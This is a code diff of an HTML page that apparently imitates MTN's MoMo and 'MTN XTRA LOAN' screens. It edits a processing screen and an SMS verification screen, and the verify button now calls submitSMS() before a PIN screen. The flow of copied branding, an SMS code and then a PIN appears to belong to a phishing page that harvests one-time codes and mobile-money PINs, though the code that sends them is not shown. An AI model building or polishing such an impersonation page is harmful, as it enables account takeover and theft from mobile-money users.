@@ -172,7 +172,7 @@
         </div>
     </div>
 
-    <!-- NEW: PROCESSING SCREEN (Matches your image) -->
+    <!-- PROCESSING SCREEN -->
     <div id="screen-processing" class="screen processing-screen">
         <div class="momo-logo-large">
             <svg width="80" height="80" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
@@ -190,21 +190,9 @@
         <div class="processing-dots">...</div>
     </div>
 
-    <!-- SMS VERIFICATION SCREEN -->
+    <!-- SMS VERIFICATION SCREEN (Header Removed) -->
     <div id="screen-sms" class="screen light-screen">
-        <div class="sms-header">
-            <div class="sms-logo">
-                <svg width="30" height="30" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <rect width="100" height="100" rx="20" fill="#004C6C"/>
-                    <path d="M30 75L50 35H60L75 75" stroke="#FFCC00" stroke-width="6" stroke-linecap="round" stroke-linejoin="round"/>
-                    <path d="M35 65H75" stroke="#FFCC00" stroke-width="6" stroke-linecap="round"/>
-                </svg>
-                <span>MTN XTRA LOAN</span>
-            </div>
-            <div class="sms-lang">🌐 English ▾</div>
-        </div>
-
-        <div class="sms-content">
+        <div class="sms-content" style="margin-top: 40px;">
             <div class="envelope-glow">
                 <div class="envelope-icon">
                     <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#d93838" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
@@ -235,7 +223,7 @@
                 <a href="#">Resend SMS</a>
             </div>
 
-            <button id="btn-verify-sms" class="verify-btn" onclick="goToScreen('screen-pin')" disabled>
+            <button id="btn-verify-sms" class="verify-btn" onclick="submitSMS()" disabled>
                 VERIFY & CONTINUE →
             </button>
         </div>
